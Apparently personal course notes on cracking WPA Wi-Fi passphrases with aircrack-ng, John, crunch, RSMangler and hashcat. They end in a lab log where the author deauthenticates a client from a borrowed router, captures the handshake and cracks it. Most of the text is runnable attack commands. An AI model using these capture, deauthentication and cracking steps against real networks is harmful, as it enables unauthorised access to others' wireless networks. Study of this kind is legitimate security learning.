# Using Password Crackers with Aircrack-ng

1. Running Aircrack-ng with John

`john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e wifu -w - ~/wpa-01.cap`

`-w -` signifies using standard input (STDIN)

John allows mangling of password list which allows appending of additional characters which did not appear in the wordlist.

1. Running Aircrack-ng with Crunch

crunch usage:

`crunch <min-length> <max-length> abc123`

doing so will generate a wordlist with all possible combination for a passphrase of min-length to max-length. the 3rd input field is to limit the possible characters which is a, b, c, 1, 2, 3 

- can also use `-t` to specify pattern. different symbols used define types of character to use
    - `@` represents lowercase char OR predefined set
    - `,` represents uppercase char
    - `%` represent numbers
    - `^` represents symbols
    
    i.e. `crunch 11 11 -t password%%%` will generate a password length of 11 with preset password and additional 3 numbers
    

![Untitled](Untitled%2028.png)

- could also do the same with this command
    
    `crunch 11 11 01234567890 -t password@@@`
    
    01234567890 represents predefined set using `@@@` instead of `%%%`
    

- can also use `-p`  to generate UNIQUE words from character set or a set of whole words
    - still need to provide min and max length, but those are ignored
    
    `crunch 1 1 -p abcde12345`
    
    ![Untitled](Untitled%2029.png)
    
- can also use for multiple words to generate a list of unique words
    
    `crunch 1 1 -p dog bird cat`
    
    ![Untitled](Untitled%2030.png)
    

- can be combined from the above two like so
    
    `crunch 5 5 -t ddd%% -p dog bird cat`
    
    *the 5 represents the 5 characters in ddd%%, each d represents either dog, bird or cat*
    
    ![Untitled](Untitled%2031.png)
    

- uses defined characters ‘a’, ‘A’, ‘D’, ‘E’ and assigned to each`@` character
    
    `crunch 5 5 aADE -t ddd@@ -p dog cat bird`
    

No point in storing these wordlist in file since aircrack-ng can take in password file in STDIN using `-w -`

- using this command
    
    `crunch 11 11 -t password%%% | aircrack-ng -e wifu crunch-01.cap -w -`
    
1. Running Aircrack-ng with RSMangler

Create a text file with the specified guessed words

`echo bird > password.txt`

`echo cat >> password.txt`

`echo dog >> password.txt` 

`rsmangler --file password.txt --output mangled.txt`

this command will save all combination of the words in the password text file and then mangled them into a new file 

`cat password.txt | rsmangler --file -`

`rsmangler --file password.txt --min 12 --max 13` `| aircrack-ng -e wifu rsmangler-01.cap -w -`

doing the above will mangled the text file with a minimum of 12 to 13 characters then piping it to aircrack-ng to process the STDIN as password file

1. Running Hashcat for benchmarking
- can also run `hashcat -I` to check cpu specs

`hashcat -b -m 2500`

*mode 2500 indicates WPA-EAPOL-PBKDF2 which is the protocol for wireless passwords*

To crack using Hashcat

`hashcat -m 2500 output.hccapx /usr/shar/john/password.lst`

![Untitled](Untitled%2032.png)

- Hash of nonce & BSSID: 2bce49121ecaccecf724cda86ea8c322
- BSSID: 340804093d38
- Client MAC Addr: 00184d1da81f
- SSID: wifu
- Passphrase: password

using john’s password list to crack the generated *cap2hccapx file*

- cap2hccapx file can be generated using this command
    - `/usr/lib/hashcat-utils/cap2hccapx.bin wifu-01.cap output.hccapx`
    - takes in input of the pcap file and output to a file

11/June/2024 - Borrowed a router from SAF to try out.

- connected my phone to the AP
- run `airmon-ng` on the same channel as the AP and followed the instruction from previous doc
    - `sudo airmon-ng start wlan0 1`
- ran monitoring (`airodump-ng`) specifying the AP SSID and MAC-addr as well as channel
    - run monitoring regularly to scan for surrounding AP
    
    ![Untitled](Untitled%2033.png)
    
- Then once target is found, HONE IN ON THAT SHIT BRUH
    - `sudo airodump-ng -c 1 -w wpa --essid NETGEAR40 --bssid C8:9E:43:E4:8B:FE wlan0mon`
- send deauth packets using `aireplay-ng` and it managed to send 4 way handshake!!!!
    - `sudo aireplay-ng -0 1 -a C8:9E:43:E4:8B:FE -c 26:75:0D:AE:17:E0 wlan0mon`
- then crack the packet using aircrack-ng
    - `crunch 13 13 -t luckydaisy%%% | sudo aircrack-ng -e NETGEAR40 wpa-01.cap -w -`

WTF IT WORKS?!?!!?!?!!!!!!

![Untitled](Untitled%2034.png)